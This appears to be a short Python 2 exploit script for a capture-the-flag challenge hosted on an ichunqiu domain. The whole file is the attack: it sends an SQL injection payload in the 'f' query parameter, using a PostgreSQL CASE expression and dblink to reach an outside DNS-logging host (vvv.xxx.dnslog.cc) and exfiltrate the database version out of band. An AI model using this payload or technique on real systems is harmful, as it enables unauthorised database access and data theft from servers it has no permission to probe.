#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/08/15, 15:54
"""

import requests as req
import urllib


URL = 'http://9a1b5fa5dd914c01b4f01e8a876aa7b7bb79d73cae32426f.changame.ichunqiu.com'

headers = {
    "User-Agent": "mobile",
    "Cookie": "PHPSESSID=nb"
}


def getf(f):
    f = urllib.quote(f)
    res = req.get(URL+"/?f=%s" % f, headers=headers)
    res = req.get(URL+"/?f=%s" % f, headers=headers)
    print "[+] Url :", res.url
    print res.content[-100:].replace('\r', '').replace('\n', '')
    # return res.content
    # if res.status_code == 200:
    #     if '<script>alert' in res.content:
    #         return 'FalseFalseFalseFalse'
    # return 'True'


if __name__ == '__main__':
    f = """1' || CASE WHEN (2>1) THEN dblink('host=vvv.xxx.dnslog.cc','select version()') ELSE '1' END--"""
    print getf(f)
